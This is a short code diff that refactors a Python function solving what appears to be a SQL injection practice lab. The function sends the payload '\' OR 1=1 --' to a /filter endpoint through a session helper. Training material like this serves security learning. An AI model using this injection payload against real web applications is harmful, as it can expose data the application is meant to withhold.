@@ -1,19 +1,11 @@
 from ..utils import *
-from urllib.parse import urlencode, urljoin
-
-import requests
+from urllib.parse import urlencode
 
 
-def solve_lab(url, proxies):
-    url = urljoin(url, "/filter")
+def solve_lab(session):
     params = {"category": "' OR 1=1 --"}
     print_info(
-        f'Performing SQL injection attack by visiting "{url}?{urlencode(params)}"'
+        f'Performing SQL injection attack by visiting "/filter?{urlencode(params)}"'
     )
-    requests.get(
-        url,
-        params={"category": "' OR 1=1 --"},
-        proxies=proxies,
-        verify=False,
-    )
+    session.get_path("/filter", params=params)
     print_success("SQL injection attack performed.\n")
